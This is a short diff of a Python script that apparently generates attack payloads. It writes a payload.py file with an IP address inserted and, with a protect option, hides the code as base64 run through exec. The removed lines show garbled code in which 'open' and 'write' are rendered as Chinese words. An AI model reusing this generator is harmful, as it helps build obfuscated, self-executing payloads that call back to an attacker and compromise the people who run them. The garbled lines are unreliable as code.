@@ -99,8 +99,8 @@ if len(sys.argv)>1:
 
 if len(sys.argv)>2:
      if sys.argv[1]=="-create" and sys.argv[2]!="-protect":
-        with 已打开('payload.py', 'w') as file:
-         file.撰写(payload.replace("payload_ip",sys.argv[2]))
+        with open('payload.py', 'w') as file:
+         file.write(payload.replace("payload_ip",sys.argv[2]))
         sys.exit(0)
 
 
@@ -112,14 +112,14 @@ if len(sys.argv)>1:
          else:
              payload = payload.replace("payload_ip",local_ipv4)
          payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
-         with 已打开('payload.py', 'w') as file:
-          file.撰写(f"p='''{payload}'''\nimport base64\nexec(base64.b64decode(p).decode('utf-8'))")
+         with open('payload.py', 'w') as file:
+          file.write(f"p='''{payload}'''\nimport base64\nexec(base64.b64decode(p).decode('utf-8'))")
          sys.exit(0)
 
 
 if len(sys.argv)==2 and sys.argv[1]=="-create":
-    with 已打开('payload.py', 'w') as file:
-     file.撰写(payload.replace("payload_ip",local_ipv4))
+    with open('payload.py', 'w') as file:
+     file.write(payload.replace("payload_ip",local_ipv4))
     sys.exit(0)
 
 
